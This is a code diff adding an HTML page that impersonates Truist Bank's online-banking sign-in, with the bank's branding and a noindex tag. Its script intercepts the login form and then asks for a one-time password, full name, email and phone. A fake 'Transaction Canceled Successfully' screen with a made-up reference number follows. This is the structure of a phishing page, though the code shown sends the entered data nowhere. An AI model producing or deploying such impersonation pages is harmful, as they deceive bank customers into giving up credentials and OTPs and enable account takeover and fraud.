@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign In | Truist Bank</title>
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon" href="/favicon.ico" />
+
+  <!-- Truist fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700&display=swap" />
+  <link rel="stylesheet" href="/etc.clientlibs/stcom-aem-globalcomponents/clientlibs/clientlib-site/resources/fonts/truist-trio/TruistTrioVF_W_Wght.woff2" as="font" crossorigin />
+
+  <style>
+    /* ── reset & base ── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --tru-purple:      #4b2d7e;
+      --tru-purple-dk:   #3a1f63;
+      --tru-purple-lt:   #ede8f4;
+      --tru-text:        #1a1a1a;
+      --tru-muted:       #5c5c5c;
+      --tru-border:      #c9c4d1;
+      --tru-error:       #c0392b;
+      --tru-green:       #2e7d32;
+      --tru-radius:      10px;
+    }
+
+    @font-face {
+      font-family: 'Truist Trio Var';
+      src: url('/etc.clientlibs/stcom-aem-globalcomponents/clientlibs/clientlib-site/resources/fonts/truist-trio/TruistTrioVF_W_Wght.woff2') format('woff2');
+      font-weight: 100 900;
+    }
+
+    html, body {
+      min-height: 100vh;
+      font-family: 'Source Sans 3', 'Truist Trio Var', sans-serif;
+      background: #f4f2f8;
+      color: var(--tru-text);
+    }
+
+    /* ── page layout ── */
+    .login-page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* top bar */
+    .login-topbar {
+      background: #fff;
+      border-bottom: 1px solid #e0dae8;
+      padding: 0 24px;
+      height: 64px;
+      display: flex;
+      align-items: center;
+    }
+
+    .login-topbar img {
+      height: 30px;
+    }
+
+    /* hero area */
+    .login-hero {
+      background: linear-gradient(135deg, #2e1a47 0%, #4b2d7e 100%);
+      padding: 48px 24px 60px;
+      text-align: center;
+      color: #fff;
+    }
+
+    .login-hero h1 {
+      font-size: clamp(1.6rem, 4vw, 2.4rem);
+      font-weight: 700;
+      margin-bottom: 10px;
+      letter-spacing: -0.02em;
+    }
+
+    .login-hero p {
+      font-size: 1rem;
+      opacity: 0.85;
+      max-width: 420px;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+
+    /* card */
+    .login-card-wrap {
+      flex: 1;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 0 16px 48px;
+      margin-top: -32px;
+    }
+
+    .login-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 8px 40px rgba(46, 26, 71, 0.13);
+      padding: 40px 36px 36px;
+      width: 100%;
+      max-width: 440px;
+    }
+
+    .login-card h2 {
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: var(--tru-purple);
+      margin-bottom: 24px;
+      text-align: center;
+    }
+
+    /* form fields */
+    .field-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .field-group input {
+      width: 100%;
+      padding: 18px 14px 8px;
+      border: 1.5px solid var(--tru-border);
+      border-radius: var(--tru-radius);
+      font-size: 1rem;
+      color: var(--tru-text);
+      background: #fafafa;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .field-group input:focus {
+      border-color: var(--tru-purple);
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(75, 45, 126, 0.1);
+    }
+
+    .field-group label {
+      position: absolute;
+      left: 14px;
+      top: 14px;
+      font-size: 1rem;
+      color: var(--tru-muted);
+      pointer-events: none;
+      transition: top 0.18s, font-size 0.18s, color 0.18s;
+    }
+
+    .field-group input:focus + label,
+    .field-group input:not(:placeholder-shown) + label {
+      top: 6px;
+      font-size: 0.72rem;
+      color: var(--tru-purple);
+      font-weight: 600;
+    }
+
+    .field-group .toggle-pw {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--tru-muted);
+      padding: 4px;
+      font-size: 0.8rem;
+    }
+
+    /* show-password SVG */
+    .show-pw-icon {
+      width: 20px;
+      height: 20px;
+      vertical-align: middle;
+    }
+
+    /* links row */
+    .login-links {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: -8px 0 24px;
+      font-size: 0.85rem;
+    }
+
+    .login-links label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--tru-muted);
+      cursor: pointer;
+    }
+
+    .login-links a {
+      color: var(--tru-purple);
+      text-decoration: none;
+    }
+
+    .login-links a:hover { text-decoration: underline; }
+
+    /* primary button */
+    .btn-signin {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      background: var(--tru-purple);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      margin-bottom: 20px;
+    }
+
+    .btn-signin:hover  { background: var(--tru-purple-dk); }
+    .btn-signin:active { transform: scale(0.98); }
+
+    .login-divider {
+      text-align: center;
+      color: var(--tru-muted);
+      font-size: 0.85rem;
+      margin-bottom: 16px;
+      position: relative;
+    }
+
+    .login-divider::before, .login-divider::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 42%;
+      height: 1px;
+      background: #ddd;
+    }
+
+    .login-divider::before { left: 0; }
+    .login-divider::after  { right: 0; }
+
+    .btn-enroll {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      background: transparent;
+      color: var(--tru-purple);
+      border: 2px solid var(--tru-purple);
+      border-radius: 50px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+      text-align: center;
+      text-decoration: none;
+    }
+
+    .btn-enroll:hover { background: var(--tru-purple); color: #fff; }
+
+    /* footer */
+    .login-footer {
+      text-align: center;
+      padding: 24px 16px;
+      font-size: 0.78rem;
+      color: var(--tru-muted);
+      border-top: 1px solid #e8e4ef;
+      background: #fff;
+    }
+
+    .login-footer a { color: var(--tru-purple); text-decoration: none; }
+    .login-footer a:hover { text-decoration: underline; }
+
+    /* ── OTP overlay ── */
+    .tru-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .tru-overlay.active { display: flex; }
+
+    .tru-backdrop {
+      position: absolute;
+      inset: 0;
+      background: rgba(0,0,0,0.52);
+      backdrop-filter: blur(2px);
+    }
+
+    .tru-panel {
+      position: relative;
+      z-index: 1;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 24px 64px rgba(0,0,0,0.2);
+      padding: 40px 36px 36px;
+      width: 100%;
+      max-width: 480px;
+      margin: 16px;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    .tru-panel-logo {
+      display: block;
+      height: 28px;
+      margin: 0 auto 18px;
+    }
+
+    .tru-panel h2 {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: var(--tru-purple);
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    .tru-panel .subtitle {
+      font-size: 0.88rem;
+      color: var(--tru-muted);
+      text-align: center;
+      margin-bottom: 26px;
+      line-height: 1.5;
+    }
+
+    .tru-form { display: flex; flex-direction: column; gap: 16px; }
+
+    .tru-field { display: flex; flex-direction: column; gap: 5px; }
+
+    .tru-field label {
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: var(--tru-purple);
+    }
+
+    .tru-field input {
+      border: 1.5px solid var(--tru-border);
+      border-radius: 8px;
+      padding: 12px 14px;
+      font-size: 1rem;
+      outline: none;
+      background: #fafafa;
+      transition: border-color 0.2s;
+    }
+
+    .tru-field input:focus {
+      border-color: var(--tru-purple);
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(75,45,126,0.1);
+    }
+
+    .tru-error {
+      font-size: 0.78rem;
+      color: var(--tru-error);
+      display: none;
+    }
+
+    .tru-btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      background: var(--tru-purple);
+      color: #fff;
+      border: 2px solid var(--tru-purple);
+      border-radius: 50px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 6px;
+    }
+
+    .tru-btn:hover { background: var(--tru-purple-dk); border-color: var(--tru-purple-dk); }
+
+    .tru-btn-outline {
+      background: transparent;
+      color: var(--tru-purple);
+    }
+
+    .tru-btn-outline:hover { background: var(--tru-purple); color: #fff; }
+
+    /* ── Success panel ── */
+    .tru-success-panel { text-align: center; }
+
+    .tru-success-icon {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 18px;
+    }
+
+    .tru-success-icon svg { width: 100%; height: 100%; }
+
+    .tru-detail-row {
+      display: flex;
+      justify-content: space-between;
+      border-top: 1px solid var(--tru-purple-lt);
+      padding: 11px 0;
+      font-size: 0.9rem;
+    }
+
+    .tru-detail-row:last-of-type {
+      border-bottom: 1px solid var(--tru-purple-lt);
+      margin-bottom: 20px;
+    }
+
+    .tru-detail-label { color: #777; }
+    .tru-detail-value { font-weight: 700; color: var(--tru-purple); }
+    .tru-green { color: var(--tru-green) !important; }
+
+    .tru-redirect-msg {
+      font-size: 0.875rem;
+      color: #666;
+      margin-bottom: 8px;
+    }
+
+    .tru-redirect-msg strong { color: var(--tru-purple); font-size: 1rem; }
+
+    .tru-progress-bar {
+      height: 6px;
+      background: var(--tru-purple-lt);
+      border-radius: 3px;
+      overflow: hidden;
+      margin-bottom: 22px;
+    }
+
+    .tru-progress-fill {
+      height: 100%;
+      width: 100%;
+      background: var(--tru-purple);
+      border-radius: 3px;
+      transition: width 1s linear;
+    }
+
+    /* mobile */
+    @media (max-width: 480px) {
+      .login-card { padding: 28px 20px; }
+      .tru-panel  { padding: 28px 18px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-page">
+
+  <!-- Top bar -->
+  <nav class="login-topbar">
+    <a href="/">
+      <img src="/static.truist.com/content/dam/global-images/truist-logo-purple.svg" alt="Truist Bank" />
+    </a>
+  </nav>
+
+  <!-- Hero -->
+  <div class="login-hero">
+    <h1>Welcome back</h1>
+    <p>Sign in to Truist online banking to manage your accounts securely.</p>
+  </div>
+
+  <!-- Login card -->
+  <div class="login-card-wrap">
+    <div class="login-card">
+      <h2>Sign in to Online Banking</h2>
+
+      <form id="login-form" novalidate>
+
+        <div class="field-group">
+          <input type="text" id="userId" name="userId" placeholder=" " autocomplete="username" autocapitalize="none" />
+          <label for="userId">User ID</label>
+        </div>
+
+        <div class="field-group">
+          <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" />
+          <label for="password">Password</label>
+          <button type="button" class="toggle-pw" id="toggle-pw" aria-label="Show password">
+            <svg class="show-pw-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+        </div>
+
+        <div class="login-links">
+          <label>
+            <input type="checkbox" id="save-user-id" />
+            Save user ID
+          </label>
+          <a href="#">Forgot user ID?</a>
+        </div>
+
+        <button type="submit" class="btn-signin">Sign in</button>
+
+      </form>
+
+      <div class="login-divider">or</div>
+      <a href="#" class="btn-enroll">Set up online banking</a>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="login-footer">
+    <p>
+      <a href="/">Truist.com</a> &nbsp;|&nbsp;
+      <a href="/privacy">Privacy</a> &nbsp;|&nbsp;
+      <a href="/terms-and-conditions">Terms</a> &nbsp;|&nbsp;
+      <a href="/fraud-and-security">Security</a>
+    </p>
+    <p style="margin-top:8px;">Truist Bank, Member FDIC. &copy;2025 Truist Financial Corporation.</p>
+  </footer>
+
+</div>
+
+
+<!-- ── OTP / Details overlay ── -->
+<div class="tru-overlay" id="otp-overlay" role="dialog" aria-modal="true" aria-labelledby="otp-title">
+  <div class="tru-backdrop"></div>
+  <div class="tru-panel">
+    <img class="tru-panel-logo"
+         src="/static.truist.com/content/dam/global-images/truist-logo-purple.svg"
+         alt="Truist" />
+    <h2 id="otp-title">Verify your identity</h2>
+    <p class="subtitle">Enter the OTP sent to your device and complete your details.</p>
+
+    <form class="tru-form" id="otp-form" novalidate>
+      <div class="tru-field">
+        <label for="l-otp">One-Time Password (OTP)</label>
+        <input type="text" id="l-otp" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric" autocomplete="one-time-code" required />
+        <span class="tru-error" id="e-otp"></span>
+      </div>
+      <div class="tru-field">
+        <label for="l-name">Full Name</label>
+        <input type="text" id="l-name" placeholder="Enter your full name" required />
+        <span class="tru-error" id="e-name"></span>
+      </div>
+      <div class="tru-field">
+        <label for="l-email">Email Address</label>
+        <input type="email" id="l-email" placeholder="Enter your email address" required />
+        <span class="tru-error" id="e-email"></span>
+      </div>
+      <div class="tru-field">
+        <label for="l-phone">Phone Number</label>
+        <input type="tel" id="l-phone" placeholder="Enter your phone number" required />
+        <span class="tru-error" id="e-phone"></span>
+      </div>
+      <button type="submit" class="tru-btn">Submit</button>
+    </form>
+  </div>
+</div>
+
+
+<!-- ── Success / Cancel overlay ── -->
+<div class="tru-overlay" id="success-overlay" role="dialog" aria-modal="true" aria-labelledby="success-title">
+  <div class="tru-backdrop"></div>
+  <div class="tru-panel tru-success-panel">
+    <div class="tru-success-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" fill="none">
+        <circle cx="32" cy="32" r="32" fill="#4CAF50"/>
+        <path d="M18 32l10 10 18-18" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <h2 id="success-title">Transaction Canceled Successfully</h2>
+    <p class="subtitle">Your transaction has been canceled. Your session is now being closed for security.</p>
+
+    <div class="tru-detail-row">
+      <span class="tru-detail-label">Status</span>
+      <span class="tru-detail-value tru-green">Completed</span>
+    </div>
+    <div class="tru-detail-row">
+      <span class="tru-detail-label">Reference</span>
+      <span class="tru-detail-value" id="ref-num"></span>
+    </div>
+
+    <p class="tru-redirect-msg">Returning to homepage in <strong id="countdown">10</strong> seconds…</p>
+    <div class="tru-progress-bar">
+      <div class="tru-progress-fill" id="progress-fill"></div>
+    </div>
+    <button class="tru-btn tru-btn-outline" id="go-home-now">Go to Homepage Now</button>
+  </div>
+</div>
+
+
+<script>
+(function () {
+  'use strict';
+
+  // ── helpers ──────────────────────────────────────────────────────────────
+  function byId(id) { return document.getElementById(id); }
+
+  function showOverlay(id) {
+    byId(id).classList.add('active');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function hideOverlay(id) {
+    byId(id).classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  function setErr(id, msg) {
+    var el = byId(id);
+    el.textContent = msg;
+    el.style.display = msg ? 'block' : 'none';
+  }
+
+  function clearErrors() {
+    ['e-otp','e-name','e-email','e-phone'].forEach(function(id){ setErr(id,''); });
+  }
+
+  function randRef() {
+    return 'TRU' + Date.now().toString(36).toUpperCase() +
+           Math.random().toString(36).slice(2,6).toUpperCase();
+  }
+
+  // ── Show/hide password ────────────────────────────────────────────────────
+  var pwField   = byId('password');
+  var toggleBtn = byId('toggle-pw');
+  if (toggleBtn) {
+    toggleBtn.addEventListener('click', function () {
+      pwField.type = pwField.type === 'password' ? 'text' : 'password';
+      toggleBtn.setAttribute('aria-label',
+        pwField.type === 'password' ? 'Show password' : 'Hide password');
+    });
+  }
+
+  // ── Step 1: intercept login form ──────────────────────────────────────────
+  var loginForm = byId('login-form');
+  if (loginForm) {
+    loginForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      clearErrors();
+      showOverlay('otp-overlay');
+      setTimeout(function(){ byId('l-otp').focus(); }, 80);
+    });
+  }
+
+  // ── Step 2: validate & submit OTP form ───────────────────────────────────
+  var otpForm = byId('otp-form');
+  if (otpForm) {
+    otpForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      clearErrors();
+
+      var otp   = byId('l-otp').value.trim();
+      var name  = byId('l-name').value.trim();
+      var email = byId('l-email').value.trim();
+      var phone = byId('l-phone').value.trim();
+      var ok    = true;
+
+      if (!otp || otp.length < 4)
+        { setErr('e-otp',   'Please enter a valid OTP (at least 4 digits).'); ok = false; }
+      if (!name)
+        { setErr('e-name',  'Full name is required.'); ok = false; }
+      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
+        { setErr('e-email', 'Please enter a valid email address.'); ok = false; }
+      if (!phone || phone.replace(/\D/g,'').length < 7)
+        { setErr('e-phone', 'Please enter a valid phone number.'); ok = false; }
+
+      if (!ok) return;
+
+      hideOverlay('otp-overlay');
+      byId('ref-num').textContent = randRef();
+      showOverlay('success-overlay');
+      startCountdown();
+    });
+  }
+
+  // ── Step 3: 10-second countdown → redirect home ──────────────────────────
+  var timer = null;
+
+  function startCountdown() {
+    var remaining = 10;
+    var fill = byId('progress-fill');
+    if (fill) { fill.style.transition = 'none'; fill.style.width = '100%'; }
+    setTimeout(function(){
+      if (fill) fill.style.transition = 'width 1s linear';
+    }, 50);
+
+    timer = setInterval(function () {
+      remaining -= 1;
+      byId('countdown').textContent = remaining;
+      if (fill) fill.style.width = (remaining * 10) + '%';
+      if (remaining <= 0) { clearInterval(timer); goHome(); }
+    }, 1000);
+  }
+
+  function goHome() {
+    clearInterval(timer);
+    window.location.href = '/';
+  }
+
+  var goBtn = byId('go-home-now');
+  if (goBtn) { goBtn.addEventListener('click', goHome); }
+
+})();
+</script>
+
+</body>
+</html>
